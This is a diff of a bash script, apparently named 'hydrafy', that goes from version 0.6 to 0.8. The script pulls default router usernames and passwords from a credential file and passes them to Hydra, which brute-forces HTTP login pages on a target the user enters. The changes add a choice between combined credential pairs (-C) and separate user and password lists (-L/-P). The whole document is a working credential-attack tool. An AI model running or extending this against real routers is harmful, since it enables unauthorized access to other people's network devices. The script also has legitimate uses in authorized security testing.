@@ -70,7 +70,9 @@ function script_info--()
 ## Support for the Router Attack method is limited to browser-based http-get requests right now,
 ## Feel free to do the work for me, if your work is good....I'll implement it and give you credit
 
-## A patched version of hydra has been included with the svn repo of hydrafy.  I included the original hydra.c file renamed to orig.hydra.c.orig for comparisons.  To compiled it do: tar xfzv hydra-7.1-src.tar.gz and drop into the directory, read the README and go from there.
+## A patched version of hydra has been included with the svn repo of hydrafy.  I included the original hydra.c file renamed to orig.hydra.c.orig for comparisons.  To compile it do: tar xfzv hydra-7.1-src.tar.gz and drop into the directory, read the README and go from there.
+
+## There is now an option for -C -or- -L and -P with reference to methodology of attack
 ##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~## 
 
 
@@ -114,20 +116,14 @@ echo -e "\033[1;34m
 -------------------------------------------------------
                   Make Your Selection
 -------------------------------------------------------
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-"
-echo -e "\033[36m
-*****Choose From The Following*****
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
 1 ~~~~~~> Display Usernames:Passwords
 
 2 ~~~~~~> Save Usernames:Passwords to a file
 
-3 ~~~~~~> Implement Router Attack via Hydra
-
+3 ~~~~~~> Implement Router Attack via Hydra\033[1;34m
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
 read selection
-clear
 case $selection in
 	1) display--;;
 
@@ -143,6 +139,7 @@ esac
 
 function display--()
 {
+clear
 echo -e "\033[1;33m
 --------------------------------------------------------"
 grep -i $ROUTER $FILE | awk -F\| '{ print $2":"$3 }'
@@ -155,6 +152,7 @@ The names above were derived from this series of routers: $ROUTER
 function file_save--()
 {
 #SAVE= ## Filename to save output to
+clear
 while [ -z $SAVE ];do
 	echo -e "\033[36m\nFile Name?"
 	read SAVE
@@ -170,36 +168,53 @@ File data derived from this series of routers: $ROUTER
 
 function hydrafy--()
 {
+style= ## Method of attack
 ip= ## Tgt address for hydra
 at= ## path for past root
-grep -i $ROUTER $FILE | awk -F\| '{ print $2":"$3 }' > snakebite.txt
-#grep -i $ROUTER $FILE | awk -F\| '{ print $2 }' | sort | uniq > user.txt
-#grep -i $ROUTER $FILE | awk -F\| '{ print $3 }' | sort | uniq > pass.txt
+clear
+while [ -z $style ];do
+	echo -e "\033[1;34m\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Username/Password Attack Style
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[1;36m
+1) -C (recommended)
+2) -L and -P\033[1;34m
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
+	read style
+	case $style in
+		1) grep -i $ROUTER $FILE | awk -F\| '{ print $2":"$3 }' > snakebite.txt ;;
 
-echo -e "\033[1;36m
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-echo -e "\033[1;34m
+		2) grep -i $ROUTER $FILE | awk -F\| '{ print $2 }' | sort | uniq > user.txt
+		grep -i $ROUTER $FILE | awk -F\| '{ print $3 }' | sort | uniq > pass.txt ;;
+
+		*) style= ;; ## Nulled
+	esac
+
+done
+
+clear
+echo -e "\033[1;36m\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[1;34m
 ########Example URL#########
 http://example.com/index.asp
 -or-
 http://192.168.1.1/index.asp
 ############################
 
-index.asp will describe the ""path past root"""
-echo -e "\033[1;36m
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+index.asp will describe the \"path past root\"
+\033[1;36m
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
 while [ -z $ip ];do
 	echo -e "\033[36m
 Tgt IP/Hostname? -----> {http:// is assumed by default} <-----"
 	read ip
 done
-while [ -z $ques ];do
+
+while [ -z $var ];do
 	echo -e "\033[36m\nDoes the URL extend past root? <y or n>"
-	read ques
-	case $ques in
+	read var
+	case $var in
 		y|Y) extend="yes" ;;
 		n|N) extend="no" ;;
-		*) ques= ;; ## Nulled
+		*) var= ;; ## Nulled
 	esac
 
 done
@@ -208,15 +223,20 @@ case $extend in
 	yes) while [ -z $at ];do
 		echo -e "\033[36m\nWhat is the path past root?"
 		read at
-done
+	done
 
-clear
-hydra $ip -C snakebite.txt -t 1 -V -f http-get /"$at" ;;
-#hydra $ip -L user.txt -P pass.txt -t 1 -V -f http-get /"$at" ;;
+	case $style in
+		1) hydra $ip -C snakebite.txt -t 1 -V -f http-get /"$at" ;;
+		2) hydra $ip -L user.txt -P pass.txt -t 1 -V -f http-get /"$at" ;;
+	esac;;
 
-	no) clear
- 	hydra $ip -C snakebite.txt -t 1 -V -f http-get / ;;
-# 	hydra $ip -L user.txt -P pass.txt -t 1 -V -f http-get / ;;
+
+	no)
+	case $style in
+		1) hydra $ip -C snakebite.txt -t 1 -V -f http-get / ;;
+		2) hydra $ip -L user.txt -P pass.txt -t 1 -V -f http-get / ;;
+	esac;;
+
 esac
 }
 
@@ -229,8 +249,8 @@ while getopts "f:r:" options; do
   esac
 done
 
-current_ver="0.6"
-rel_date="4 February 2012"
+current_ver="0.8"
+rel_date="5 February 2012"
 if [[ -n "$FILE" && -n "$ROUTER" ]]; then
 	menu--
 else
